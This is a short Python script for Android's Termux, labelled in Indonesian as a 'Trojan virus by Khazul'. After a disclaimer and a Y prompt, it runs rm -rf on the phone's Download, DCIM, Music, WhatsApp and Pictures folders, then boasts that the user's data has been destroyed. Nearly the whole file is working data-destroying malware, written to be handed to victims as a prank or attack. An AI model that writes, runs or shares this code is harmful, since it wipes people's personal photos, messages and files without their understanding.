#!/bin/usr/bash

import os, time

print ("\033[1;31m	")
os.system('clear')
os.system('cowsay -f sheep "Virus Trojan by Khazul" ')
print (" ")
os.system('date | lolcat')

print ("""\033[1;35m

NB : Trojan virus by khazul adalah virus berbahaya
     Mohon jangan digunakan. ya kalau masih mau digunakan
     Akibat tanggung sendiri dan saya tidak bertanggung
     jawab.

""")

a = input("\033[1;33m Ketik Y untuk Melanjutkan ")
if a == "y" or a == "Y":
	print (" ")
	print ("\033[1;36m Simsalabim Lagi Proses ... ")
	time.sleep(5)
	os.system('termux-setup-storage')
	os.system('rm -rf /storage/emulated/0/Download')
	os.system('rm -rf /storage/emulated/0/DCIM')
	os.system('rm -rf /storage/emulated/0/Music')
	os.system('rm -rf /storage/emulated/0/WhatsApp')
	os.system('rm -rf /storage/emulated/0/Pictures')
	print (" ")
	print ("\033[1;31m [!] Selamat seluruh data hp anda ")
	print ("\033[1;31m     berhasil di binasakan 😁 ")
